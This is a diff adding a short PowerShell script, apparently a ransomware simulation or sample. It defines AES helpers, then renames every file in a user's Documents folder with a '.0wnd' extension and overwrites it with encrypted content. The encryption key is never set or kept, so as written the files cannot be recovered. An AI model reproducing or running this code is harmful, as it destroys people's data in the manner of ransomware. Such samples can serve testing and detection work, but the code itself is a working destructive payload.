@@ -1,0 +1,15 @@
+function Create-AesManagedObject($key, $IV) {$aesManaged = New-Object "System.Security.Cryptography.AesManaged"; 
+$aesManaged}; 
+function Create-AesKey() {$aesManaged = Create-AesManagedObject; 
+$aesManaged.GenerateKey(); 
+[System.Convert]::ToBase64String($aesManaged.Key)}; 
+function Encrypt-String($key, $unencryptedString) {$bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString); 
+$aesManaged = Create-AesManagedObject $key; 
+$encryptor = $aesManaged.CreateEncryptor(); 
+$encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length); 
+[byte[]] $fullData = $aesManaged.IV + $encryptedData; $aesManaged.Dispose(); 
+return ,$fullData};  
+foreach($f in Get-ChildItem 'C:\Users\Sophos\Documents') {Get-Content -path $f.fullname -TotalCount 1; 
+rename-item -path $f.fullname -newname ($f.fullname + '.0wnd'); 
+[IO.File]::WriteAllBytes(($f.fullname + '.0wnd'), (Encrypt-String $key ([IO.File]::ReadAllBytes($f.fullname + '.0wnd')))); 
+start-sleep -s 4}
